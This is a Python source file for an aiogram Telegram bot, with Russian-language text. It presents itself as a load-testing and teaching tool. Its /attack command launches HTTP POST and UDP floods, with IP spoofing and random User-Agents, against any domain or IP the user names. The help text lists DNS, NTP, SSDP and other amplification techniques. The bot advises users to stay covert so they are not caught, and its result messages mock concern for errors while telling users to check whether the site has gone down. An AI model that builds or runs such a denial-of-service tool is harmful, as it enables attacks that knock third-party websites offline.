import asyncio
import logging
from aiogram import Router, types, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from core.parser import parse_attack_command
from attacks.http_post1 import http_attack as http_post1
from attacks.http_post2 import http_attack as http_post2
from attacks.http_post3 import http_attack as http_post3
from attacks.udp import udp_attack
from keyboards import back_to_start_keyboard, back_to_help_keyboard
from aiogram.utils.markdown import hbold

router = Router()

class AttackInput(StatesGroup):
    waiting_for_missing = State()

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass

    msg = await message.answer(
        "👋 Привет! Я бот для нагрузочного тестирования сайтов.\n\n"
        "Чтобы начать атаку, используй командный конструктор:\n\n"
        "<code>/attack ip=example.com ports=80,443 iter=5 count=100 spoof=Y agent=Y method=udp</code>\n\n"
        "⚠ Параметры: ip, ports, iter, count, spoof, agent, method\n\n"
        "Если ничего не понятно то команда /help в помощь."
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_start"})

@router.message(Command("help"))
async def cmd_help(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass

    msg = await message.answer(
        "<b>📘 Справка:</b>\n\n"
        "🔹 /start — Приветствие\n"
        "🔹 /attack — Запуск атаки через параметры\n"
        "🔹 /attack_parameters - Параметры атаки\n"
        "🔹 /attack_example — Пример команды атаки\n"
        "🔹 /attack_methods — Обзор доступных техник (UDP/HTTP)\n\n"
        "ℹ Дополнительно:\n\n"
        "🔸 /about_bot — Кто я такой и чем полезен\n"
        "🔸 /about_project — Об идее проекта и целях\n"
        "🔸 /settings — Посмотреть текущие настройки",
        reply_markup=back_to_start_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_start"})

@router.message(Command("attack_parameters"))
async def attack_parameters(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass
    msg = await message.answer(
        "📖 Обучение: Обзор параметров команды /attack\n\n"
        "Команда /attack позволяет запускать различные виды нагрузочного тестирования. Она принимает параметры в виде ключей: \n"
        "<code>/attack ip=... ports=... iter=... count=... spoof=Y/N agent=Y/N method=udp/http http_method=post/get</code>\n\n"
        "🔍 Описание параметров: \n\n"
        "✅ ip=...\n"
        "Цель атаки — IP, домен или URL (например: example.com, 1.1.1.1).\n\n"
        "✅ ports=80,443\n"
        "Список портов, куда направлять трафик. Обязателен для UDP-атак. В HTTP используется только если порт указан в URL (редко).\n\n"
        "✅ iter=5\n"
        "Сколько раз повторить атаку. Используется для циклов или порций.\n\n"
        "✅ count=100\n"
        "Сколько пакетов/запросов отправлять за одну итерацию.\nИтого: общее количество запросов = iter × count\n\n"
        "✅ spoof=Y/N\n"
        "Включает IP Spoofing (подмену IP). Работает только с UDP.\n• Y — включить\n• N — отключить (по умолчанию)\n\n"
        "✅ agent=Y/N\n"
        "Добавляет случайные User-Agent заголовки в HTTP-запросы.\n• Y — включить (рекомендуется)\n• N — выключить\n\n"
        "✅ method=udp/http\n"
        "Выбор метода атаки:\n• udp — UDP Flood и Amplification техники\n• http — HTTP GET/POST-запросы\n\n"
        "✅ http_method=post/get\n"
        "Подтип HTTP-запроса (по умолчанию POST). Используется только при method=http\n\n\n"
        "❗ Влияние параметров в зависимости от метода\n\n"
        "• В методе HTTP используются: ip, iter, count, agent, http_method.\nНо игнорируются: spoof, ports\n\n"
        "• В методе UDP используются: ip, ports, iter, count, spoof.\nНо игнорируются: agent, http_method\n\n\n",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})



@router.message(Command("attack_example"))
async def attack_example(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass
    msg = await message.answer(
        "📦 Примеры атак:\n\n"
        "1. UDP Flood с подменой IP:\n"
        "<code>/attack ip=example.com ports=80,443 iter=5 count=100 spoof=Y agent=N method=udp</code>\n\n"
        "2. HTTP POST с User-Agent:\n"
        "<code>/attack ip=example.com iter=10 count=500 spoof=N agent=Y method=http http_method=post</code>\n\n"
        "3. HTTP GET с малой нагрузкой:\n"
        "<code>/attack ip=example.com iter=1 count=20 method=http http_method=get</code>\n\n\n"
        "Рекомендации:\n"
        "• Не забывай всегда указывать method — это ключевой параметр.\n"
        "• Не используй spoof в HTTP — он бесполезен там.\n"
        "• Для UDP атак желательно указывать только нужные порты (например, 123 для NTP).\n"
        "• agent=Y желательно при HTTP-тестировании.\n\n\n"
        "Если в результатах возвращает «❌ Все запросы были неуспешными. Сервер мог отклонить их или быть недоступен:\n"
        "- Сервер ответил 403 Forbidden\n"
        "- Сервер ответил 500 Internal Server Error\n"
        "- Запрос не дошёл (сервер недоступен / timeout / DNS ошибка и т.д.)\n"
        "- Прокси не работал\n"
        "- Сервер отбросил нагрузку\n"
        "- Или же просто сайт уже лег))\n\n",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})


@router.message(Command("attack_methods"))
async def attack_methods(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass
    msg = await message.answer(
        "<b>🧨 Методы атак:</b>\n\n"
        "🔹 <b>HTTP-атаки</b> — создают нагрузку на веб-сервер, имитируя реальных пользователей.\n"
        "• <code>HTTP POST</code> — отправка форм/данных.\n"
        "• <code>HTTP GET</code> — имитация переходов по ссылкам.\n"
        "• Поддерживается <code>User-Agent</code> для имитации браузеров.\n\n"
        "🔹 <b>UDP-атаки</b> — направлены на сетевой уровень (быстро и сложно отследить).\n"
        "• <code>UDP Flood</code> — мусорный трафик на выбранные порты.\n"
        "• <code>DNS Amplification</code> — перегрузка через открытые DNS-серверы.\n"
        "• <code>NTP Amplification</code> — отражение пакетов от NTP-серверов.\n"
        "• <code>Chargen / SNMP / SSDP / TFTP Flood</code> — атаки через уязвимые службы.\n\n"
        "⚙️ Все методы можно настроить через <code>/attack</code> с параметрами.",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})

@router.message(Command("about_bot"))
async def about_bot(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: pass

    msg = await message.answer(
        "<b>🤖 О боте:</b>\n\n"
        "Я — Telegram-бот, созданный для проведения <u>нагрузочного тестирования</u> веб-сервисов и изучения DoS-техник в учебных целях.\n\n"
        "🔍 Мои возможности:\n"
        "• Поддержка HTTP и UDP атак\n"
        "• Разные техники: Flood, Amplification, Spoofing\n"
        "• Работа с параметрами, гибкая настройка\n"
        "• Интерактивное меню и команды\n\n"
        "⚠️ <b>Предупреждение:</b>\n"
        "Все действия должны выполняться скрытно и непалевно)) иначе рискуешь быть пойманным.",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})

@router.message(Command("about_project"))
async def about_project(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: pass

    msg = await message.answer(
        "<b>📂 Об идее проекта:</b>\n\n"
        "🔧 Этот бот — часть <b>учебного проекта по кибербезопасности</b> и нагрузочному тестированию.\n"
        "Цель: изучить, как работает трафик, какие бывают уязвимости и как выстраивать защиту.\n\n"
        "🧠 Включает:\n"
        "• Разные уровни атак (HTTP, UDP)\n"
        "• Модульную структуру\n"
        "• Систему логирования и спуфинг\n"
        "• Работа с URL/IP/портами\n\n"
        "📌 Проект <b>не предназначен для деструктивных действий</b> — только для анализа и обучения.",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})

@router.message(Command("settings"))
async def settings_view(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: pass

    spoofing_default = "None."
    agent_default = "None"
    concurrency = "None"

    msg = await message.answer(
        "<b>⚙️ Текущие настройки:</b>\n\n"
        f"• IP Spoofing: <b>{spoofing_default}</b>\n"
        f"• User-Agent: <b>{agent_default}</b>\n"
        f"• Кол-во одновременных HTTP-запросов: <b>{concurrency}</b>\n"
        "• Формат ввода параметров: <code>/attack ip=... ports=... iter=... count=...</code>\n\n"
        "Настройки будут расширяться в будущем.",
        reply_markup=back_to_help_keyboard()
    )
    await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_help"})


@router.callback_query(F.data == "back_to_start")
async def back_to_start(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await callback.bot.delete_message(callback.message.chat.id, msg_id)
        except:
            pass

    previous_handler = data.get("previous_handler")
    
    if previous_handler == "cmd_help":
        await cmd_help(callback.message, state)
    elif previous_handler == "cmd_start":
        await cmd_start(callback.message, state)
    elif previous_handler == "attack_parameters":
        await attack_parameters(callback.message, state)
    elif previous_handler == "attack_example":
        await attack_example(callback.message, state)
    else:
        await cmd_start(callback.message, state)


@router.callback_query(F.data == "back_to_help")
async def back_to_help(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    
    if msg_id := data.get("msg_id"):
        try:
            await callback.bot.delete_message(callback.message.chat.id, msg_id)
        except:
            pass

    previous_handler = data.get("previous_handler")
    
    if previous_handler == "cmd_help":
        await cmd_help(callback.message, state)
    elif previous_handler == "cmd_start":
        await cmd_start(callback.message, state)
    elif previous_handler == "attack_parameters":
        await attack_parameters(callback.message, state)
    elif previous_handler == "attack_example":
        await attack_example(callback.message, state)
    else:
        await cmd_start(callback.message, state)




@router.message(Command("attack"))
async def cmd_attack(message: Message, state: FSMContext):
    data = await state.get_data()
    if msg_id := data.get("msg_id"):
        try:
            await message.bot.delete_message(message.chat.id, msg_id)
        except: 
            pass
    args_text = message.text.replace("/attack", "").strip()

    if not args_text:
        msg = await message.answer("Не указаны параметры атаки. Пример:\n"
                             "/attack ip=1.1.1.1 ports=80,443 iter=5 count=100 spoof=Y agent=Y method=udp",
                             reply_markup=back_to_start_keyboard())
        return await state.set_data({"msg_id": msg.message_id, "previous_handler": "cmd_start"})

    try:
        params = parse_attack_command(args_text)
    except ValueError as e:
        await message.answer(f"Ошибка в параметрах: {e}", reply_markup=back_to_start_keyboard())
        return

    http_display = f"{params['method'].upper()}/{params['technique'].upper()}"
    await message.answer(
        f"🚀 Запускаем атаку с параметрами:\n"
        f"<b>Цель:</b> {params['ip']}\n"
        f"<b>Порты:</b> {params['ports']}\n"
        f"<b>Итерации:</b> {params['iter']}\n"
        f"<b>Пакетов на итерацию:</b> {params['count']}\n"
        f"<b>Спуфинг:</b> {'Да' if params['spoof'] else 'Нет'}\n"
        f"<b>User-Agent:</b> {'Да' if params['agent'] else 'Нет'}\n"
        f"<b>Метод:</b> {http_display}")
    
    if params['method'] == "http":
        http_method = params.get('technique', 'post')

        if http_method == "post1":
            success, total = await http_post1(
                user_id=message.from_user.id,
                target_url=params['ip'],
                num_requests=params['count'] * params['iter'],
                user_agent=params['agent']
            )
        elif http_method == "post2":
            success, total = await http_post2(
                user_id=message.from_user.id,
                target_url=params['ip'],
                num_requests=params['count'] * params['iter'],
            )
        elif http_method == "post3":
            success, total = await http_post3(
                user_id=message.from_user.id,
                target_url=params['ip'],
                num_requests=params['count'] * params['iter'],
                user_agent=params['agent']
            )
        else:
            await message.answer("❌ Неизвестная техника HTTP-атаки. Допустимые: post1, post2, post3")
            return

        percent = round((success / total) * 100, 2) if total else 0

        if success == 0:
            result = "❌ Все запросы были неуспешными. Сервер мог отклонить их или быть недоступен? Да кого оно волнует, главное теперь проверь сайт, встал ли он..."
        elif success < total * 0.3:
            result = "⚠️ Большинство запросов были отклонены. Возможна защита или ошибка прокси? Да кого оно волнует, главное теперь проверь сайт, встал ли он..."
        else:
            result = "✅ Атака прошла успешно. Мои поздравления))"

        await message.answer(
            f"<b>📊 Атака завершена</b>\n"
            f"Метод: HTTP ({http_method.upper()})\n"
            f"Цель: {params['ip']}\n"
            f"Успешных запросов: {success} из {total} ({percent}%)\n"
            f"Результат: {result}"
        )


    
